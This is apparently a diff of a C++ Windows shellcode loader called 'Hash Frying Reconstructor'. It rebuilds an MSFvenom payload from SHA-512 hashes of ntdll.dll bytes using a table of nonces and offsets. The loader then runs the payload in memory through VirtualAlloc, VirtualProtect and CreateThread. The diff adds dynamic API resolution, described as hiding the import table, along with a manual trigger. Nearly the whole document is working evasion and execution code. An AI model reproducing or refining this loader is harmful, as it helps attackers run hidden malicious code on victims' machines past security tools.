@@ -9,14 +9,18 @@
 // Link the Cryptography Next Generation (CNG) library
 #pragma comment(lib, "bcrypt.lib")
 
-// The coordinates mined by the GPU
+// --- DYNAMIC API TYPEDEFS ---
+typedef LPVOID(WINAPI* PFUNC_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL(WINAPI* PFUNC_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
+typedef HANDLE(WINAPI* PFUNC_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef DWORD(WINAPI* PFUNC_WaitForSingleObject)(HANDLE, DWORD);
+
 struct KeybookEntry {
     uint64_t nonce;
     int offset;
     int length;
 };
 
-// Convert a byte array to a lowercase hex string
 std::string BytesToHexString(const std::vector<BYTE>& bytes) {
     std::ostringstream oss;
     for (BYTE b : bytes) {
@@ -25,7 +29,6 @@ std::string BytesToHexString(const std::vector<BYTE>& bytes) {
     return oss.str();
 }
 
-// Convert a hex string back to raw bytes for execution
 std::vector<BYTE> HexStringToBytes(const std::string& hex) {
     std::vector<BYTE> bytes;
     for (size_t i = 0; i < hex.length(); i += 2) {
@@ -37,12 +40,14 @@ std::vector<BYTE> HexStringToBytes(const std::string& hex) {
 }
 
 int main() {
-    std::cout << "[*] Initiating Hash Frying Reconstructor..." << std::endl;
+    std::cout << "[*] Initiating Hash Frying Reconstructor (Diagnostic Ghost Mode)..." << std::endl;
 
+    // 1. READ THE ENTROPY SOURCE
     const char* source_file = "C:\\Windows\\System32\\ntdll.dll";
     HANDLE hFile = CreateFileA(source_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        std::cerr << "[!] Environmental Mismatch: Cannot read entropy source." << std::endl;
+        std::cerr << "[!] CRASH POINT: Cannot read entropy source." << std::endl;
+        std::cin.get();
         return 1;
     }
 
@@ -51,8 +56,16 @@ int main() {
     ReadFile(hFile, seed.data(), 5120, &bytesRead, NULL);
     CloseHandle(hFile);
 
-    // [PASTE YOUR EXACT KEYBOOK ARRAY HERE]
-  std::vector<KeybookEntry> keybook = {
+    if (bytesRead != 5120) {
+        std::cerr << "[!] CRASH POINT: Seed file altered or truncated." << std::endl;
+        std::cin.get();
+        return 1;
+    }
+
+    // ==========================================
+    // PASTE YOUR EXTRACTED KEYBOOK ARRAY HERE
+    // ==========================================
+    std::vector<KeybookEntry> keybook = {
         {121908905, 39, 8},
         {10077592, 31, 8},
         {20884329, 109, 8},
@@ -123,16 +136,26 @@ int main() {
         {1132045, 110, 8},
         {10384794, 90, 8}
     };
+    // ==========================================
+
+    if (keybook.empty()) {
+        std::cerr << "[!] CRASH POINT: Keybook is empty. Did you forget to paste the array?" << std::endl;
+        std::cin.get();
+        return 1;
+    }
 
     std::vector<BYTE> final_shellcode;
 
+    // 2. INITIALIZE BCRYPT
     BCRYPT_ALG_HANDLE hAlg = NULL;
     BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA512_ALGORITHM, NULL, 0);
+
     DWORD cbHashObject = 0, cbData = 0;
     BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbHashObject, sizeof(DWORD), &cbData, 0);
     std::vector<BYTE> pbHashObject(cbHashObject);
     std::vector<BYTE> pbHash(64);
 
+    // 3. THE ASSEMBLY LOOP
     std::cout << "[*] Extracting Shellcode from Environment..." << std::endl;
     for (const auto& key : keybook) {
         BCRYPT_HASH_HANDLE hHash = NULL;
@@ -147,35 +170,66 @@ int main() {
         std::string full_hash_hex = BytesToHexString(pbHash);
         std::string hex_fragment = full_hash_hex.substr(key.offset, key.length);
         std::vector<BYTE> raw_bytes = HexStringToBytes(hex_fragment);
+
         final_shellcode.insert(final_shellcode.end(), raw_bytes.begin(), raw_bytes.end());
     }
+
     BCryptCloseAlgorithmProvider(hAlg, 0);
 
-    // --- SANITY CHECK: VERIFY THE RECONSTRUCTED MATH ---
+    // --- SANITY CHECK ---
     std::string test_hex = BytesToHexString(final_shellcode);
-    std::cout << "\n[!] RECONSTRUCTED PAYLOAD HEAD: " << test_hex.substr(0, 30) << "..." << std::endl;
-    std::cout << "[!] EXPECTED METASPLOIT HEAD: fc4883e4f0e8c00000004151415052..." << std::endl;
-
     if (test_hex.substr(0, 10) != "fc4883e4f0") {
-        std::cout << "\n[CRITICAL FAILURE] Math Mismatch! The GPU hashed differently than Windows BCrypt." << std::endl;
+        std::cout << "\n[!] CRASH POINT: Math Mismatch! GPU output does not match MSFvenom header." << std::endl;
+        std::cin.get();
+        return 1;
+    }
+    std::cout << "[+] Math verified. MSFvenom header detected." << std::endl;
+
+    // 4. DYNAMIC API RESOLUTION
+    std::cout << "[*] Obfuscating IAT via Dynamic Resolution..." << std::endl;
+
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+
+    PFUNC_VirtualAlloc pVirtualAlloc = (PFUNC_VirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
+    PFUNC_VirtualProtect pVirtualProtect = (PFUNC_VirtualProtect)GetProcAddress(hKernel32, "VirtualProtect");
+    PFUNC_CreateThread pCreateThread = (PFUNC_CreateThread)GetProcAddress(hKernel32, "CreateThread");
+    PFUNC_WaitForSingleObject pWaitForSingleObject = (PFUNC_WaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");
+
+    if (!pVirtualAlloc || !pVirtualProtect || !pCreateThread || !pWaitForSingleObject) {
+        std::cerr << "[!] CRASH POINT: Failed to dynamically resolve APIs." << std::endl;
+        std::cin.get();
         return 1;
     }
 
-    // --- EVASIVE EXECUTION (Bypass CFG & Thread Traps) ---
-    std::cout << "\n[*] Allocating Executable Memory..." << std::endl;
-    void* exec_mem = VirtualAlloc(0, final_shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    // 5. INVISIBLE EXECUTION
+    std::cout << "[*] Allocating Executable Memory..." << std::endl;
+
+    void* exec_mem = pVirtualAlloc(0, final_shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     RtlMoveMemory(exec_mem, final_shellcode.data(), final_shellcode.size());
 
     DWORD oldProtect;
-    VirtualProtect(exec_mem, final_shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);
+    pVirtualProtect(exec_mem, final_shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);
 
-    std::cout << "[!] Detonating Shellcode via CreateThread..." << std::endl;
+    // --- THE TRIPWIRE ---
+    std::cout << "[!] System Ready. Memory Allocated and Protected." << std::endl;
+    std::cout << "[?] PRESS ENTER TO PULL THE TRIGGER..." << std::endl;
+    std::cin.get();
 
-    // CreateThread is much safer for executing shellcode in C++ than a direct jump
-    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
+    std::cout << "[!] Detonating Shellcode via Dynamic CreateThread..." << std::endl;
 
-    // Wait for the thread to actually spawn the calculator before closing the C++ program
-    WaitForSingleObject(hThread, 3000);
+    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
 
+    if (hThread == NULL) {
+        std::cerr << "[!] CRASH POINT: CreateThread failed to launch the payload." << std::endl;
+        std::cin.get();
+        return 1;
+    }
+
+    std::cout << "[*] Thread created successfully. Waiting for payload execution..." << std::endl;
+    // Increased wait time to 5 seconds to ensure slow threads have time to pop
+    pWaitForSingleObject(hThread, 5000);
+
+    std::cout << "[+] Execution sequence completed. PRESS ENTER TO EXIT." << std::endl;
+    std::cin.get();
     return 0;
 }
